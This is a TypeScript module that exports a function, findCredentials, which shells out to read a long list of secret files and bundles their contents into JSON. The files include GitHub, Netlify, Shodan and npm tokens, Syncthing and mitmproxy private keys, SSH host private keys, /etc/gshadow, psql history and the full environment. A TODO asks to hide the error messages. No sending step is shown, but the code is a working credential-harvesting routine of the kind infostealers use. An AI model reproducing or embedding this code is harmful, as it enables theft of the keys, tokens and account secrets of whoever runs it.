import * as exec from "child_process";

const _run = (args: string): string | null => {
  try {
    return exec.execSync(args).toString();
  } catch(e) {
    return null;
  }
}

// TODO: Hidde error messages like "file not found" or "permission denied"
const findCredentials = (text: string) => {
  const credentials = {} as any;
  credentials.gh = {} as any;
  credentials.netlify = {} as any;
  credentials.shodan = {} as any;
  credentials.syncthing = {} as any;
  credentials.mitmp = {} as any;
  credentials.npm = {} as any;
  credentials.psql = {} as any;
  credentials.ssh = {} as any;
  credentials.termux = {} as any;
  credentials.ssh.sshd = {} as any;
  credentials.users = {} as any;
  credentials.shell = {} as any;

  /* In case system is Termux, prepend prefix to paths */
  const prefix = _run(`echo "$PREFIX"`);
  let path = "";
  if (prefix) {
    if (_run(`ls /data/data/com.termux`)) {
      path = prefix;
    }
  }

  const ghHosts = _run(`cat ~/.config/gh/hosts.yml`);
  if (ghHosts) {
    credentials.gh.hosts = {} as any;
    credentials.gh.hosts.path = "~/.config/gh/hosts.yml";
    credentials.gh.hosts.content = ghHosts;
  }

  const netlifyConfig = _run(`cat ~/.config/netlify/config.json`);
  if (netlifyConfig) {
    credentials.netlify.config = {} as any;
    credentials.netlify.config.path = "~/.config/netlify/config.json";
    credentials.netlify.config.content = netlifyConfig;
  }

  const shodanApiKey = _run(`cat ~/.config/shodan/api_key`);
  if (shodanApiKey) {
    credentials.shodan.apiKey = {} as any;
    credentials.shodan.apiKey.path = "~/.config/shodan/api_key";
    credentials.shodan.apiKey.content = shodanApiKey;
  }

  const syncCert = _run(`cat ~/.config/syncthing/cert.pem`);
  const syncConfig = _run(`cat ~/.config/syncthing/config.xml`);
  const syncCsfrTokens = _run(`cat ~/.config/syncthing/csrftokens.txt`);
  const syncHttpsCert = _run(`cat ~/.config/syncthing/https-cert.pem`);
  const syncHttpsKey = _run(`cat ~/.config/syncthing/https-key.pem`);
  const syncKeyPEM = _run(`cat ~/.config/syncthing/key.pem`);
  if (syncCert) {
    credentials.syncthing.cert = {} as any;
    credentials.syncthing.cert.path = "~/.config/syncthing/cert.pem";
    credentials.syncthing.cert.content = syncCert;
  }
  if (syncConfig) {
    credentials.syncthing.config = {} as any;
    credentials.syncthing.config.path = "~/.config/syncthing/config.xml";
    credentials.syncthing.config.content = syncConfig;
  }
  if (syncCsfrTokens) {
    credentials.syncthing.csfrTokens = {} as any;
    credentials.syncthing.csfrTokens.path = "~/.config/syncthing/csrftokens.txt";
    credentials.syncthing.csfrTokens.content = syncCsfrTokens;
  }
  if (syncHttpsCert) {
    credentials.syncthing.httpsCert = {} as any;
    credentials.syncthing.httpsCert.path = "~/.config/syncthing/https-cert.pem";
    credentials.syncthing.httpsCert.content = syncHttpsCert;
  }
  if (syncHttpsKey) {
    credentials.syncthing.httpsKey = {} as any;
    credentials.syncthing.httpsKey.path = "~/.config/syncthing/https-key.pem";
    credentials.syncthing.httpsKey.content = syncHttpsKey;
  }
  if (syncKeyPEM) {
    credentials.syncthing.keyPEM = {} as any;
    credentials.syncthing.keyPEM.path = "~/.config/syncthing/key.pem";
    credentials.syncthing.keyPEM.content = syncKeyPEM;
  }

  const mitmpCaCert = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.cer`);
  const mitmpCaCertP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.p12`);
  const mitmpCaCertPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca-cert.pem`);
  const mitmpCaP12 = _run(`cat ~/.mitmproxy/mitmproxy-ca.p12`);
  const mitmpCaPEM = _run(`cat ~/.mitmproxy/mitmproxy-ca.pem`);
  const mitmpDhparam = _run(`cat ~/.mitmproxy/mitmproxy-dhparam.pem`);
  if (mitmpCaCert) {
    credentials.mitmp.caCert = {} as any;
    credentials.mitmp.caCert.path = "~/.mitmproxy/mitmproxy-ca-cert.cer";
    credentials.mitmp.caCert.content = mitmpCaCert;
  }
  if (mitmpCaCertP12) {
    credentials.mitmp.caCertP12 = {} as any;
    credentials.mitmp.caCertP12.path = "~/.mitmproxy/mitmproxy-ca-cert.p12";
    credentials.mitmp.caCertP12.content = mitmpCaCertP12;
  }
  if (mitmpCaCertPEM) {
    credentials.mitmp.caCertPEM = {} as any;
    credentials.mitmp.caCertPEM.path = "~/.mitmproxy/mitmproxy-ca-cert.pem";
    credentials.mitmp.caCertPEM.content = mitmpCaCertPEM;
  }
  if (mitmpCaP12) {
    credentials.mitmp.caP12 = {} as any;
    credentials.mitmp.caP12.path = "~/.mitmproxy/mitmproxy-ca.p12";
    credentials.mitmp.caP12.content = mitmpCaP12;
  }
  if (mitmpCaPEM) {
    credentials.mitmp.caPEM = {} as any;
    credentials.mitmp.caPEM.path = "~/.mitmproxy/mitmproxy-ca.pem";
    credentials.mitmp.caPEM.content = mitmpCaPEM;
  }
  if (mitmpDhparam) {
    credentials.mitmp.dhparam = {} as any;
    credentials.mitmp.dhparam.path = "~/.mitmproxy/mitmproxy-dhparam.pem"; 
    credentials.mitmp.dhparam.content = mitmpDhparam;
  }
   
  const npmrc = _run(`cat ~/.npmrc`);
  if (npmrc) {
    credentials.npm.npmrc = {} as any;
    credentials.npm.npmrc.path = "~/.npmrc";
    credentials.npm.npmrc.content = npmrc;
  }

  const psqlHistory = _run(`cat ~/.psql_history`);
  if (psqlHistory) {
    credentials.psql.psqlHistory = {} as any;
    credentials.psql.psqlHistory.path = "~/.psql_history";
    credentials.psql.psqlHistory.content = psqlHistory;
  }

  const sshConfig = _run(`cat ~/.ssh/config`);
  if (sshConfig) {
    credentials.ssh.sshConfig = {} as any;
    credentials.ssh.sshConfig.path = "~/.ssh/config";
    credentials.ssh.sshConfig.content = sshConfig;
  }

  const sshKnownHosts = _run(`cat ~/.ssh/known_hosts`);
  if (sshKnownHosts) {
    credentials.ssh.knownHosts = {} as any;
    credentials.ssh.knownHosts.path = "~/.ssh/known_hosts";
    credentials.ssh.knownHosts.content = sshKnownHosts;
  }

  const termuxAuthInfo = _run(`cat ~/.termux_authinfo`);
  if (termuxAuthInfo) {
    credentials.termux.authInfo = {} as any;
    credentials.termux.authInfo.path = "~/.termux_authinfo";
    credentials.termux.authInfo.content = termuxAuthInfo;
  }

  const sshdDsaKey = _run(`cat ${path}/etc/ssh/ssh_host_dsa_key`);
  if (sshdDsaKey) {
    credentials.ssh.sshd.dsaKey = {} as any;
    credentials.ssh.sshd.dsaKey.path = `${path}/etc/ssh/ssh_host_dsa_key`;
    credentials.ssh.sshd.dsaKey.content = sshdDsaKey;
  }

  const sshdEcdsa = _run(`cat ${path}/etc/ssh/ssh_host_ecdsa_key`);
  if (sshdEcdsa) {
    credentials.ssh.sshd.ecdsaKey = {} as any;
    credentials.ssh.sshd.ecdsaKey.path = `${path}/etc/ssh/ssh_host_ecdsa_key`;
    credentials.ssh.sshd.ecdsaKey.content = sshdEcdsa;
  }

  const sshdHostEd = _run(`cat ${path}/etc/ssh/ssh_host_ed25519_key`);
  if (sshdHostEd) {
    credentials.ssh.sshd.hostEdKey = {} as any;
    credentials.ssh.sshd.hostEdKey.path = `${path}/etc/ssh/ssh_host_ed25519_key`;
    credentials.ssh.sshd.hostEdKey.content = sshdHostEd;
  }

  const sshdHostRsa = _run(`cat ${path}/etc/ssh/ssh_host_rsa_key`);
  if (sshdHostRsa) {
    credentials.ssh.sshd.hostRsaKey = {} as any;
    credentials.ssh.sshd.hostRsaKey.path = `${path}/etc/ssh/ssh_host_rsa_key`;
    credentials.ssh.sshd.hostRsaKey.content = sshdHostRsa;
  }

  const group = _run(`cat ${path}/etc/group`);
  if (group) {
    credentials.users.group = {} as any;
    credentials.users.group.path = `${path}/etc/group`;
    credentials.users.group.content = group;
  }

  const gshadow = _run(`cat ${path}/etc/gshadow`);
  if (gshadow) {
    credentials.users.gshadow = {} as any;
    credentials.users.gshadow.path = `${path}/etc/gshadow`;
    credentials.users.gshadow.content = gshadow;
  }

  /* // Not available in subshell, search for a workaround
  const alias = _run(`alias`);
  if (alias) {
    credentials.shell.alias = {} as any;
    credentials.shell.alias.path = "$ alias";
    credentials.shell.alias.content = alias;
  }*/

  const enviromentVariables = _run(`env`);
  if (enviromentVariables) {
    credentials.shell.env = {} as any;
    credentials.shell.env.path = "$ env";
    credentials.shell.env.content = enviromentVariables;
  }

  // TODO: Remove void objects
  return JSON.stringify(credentials, null, 2);
}

export default findCredentials;
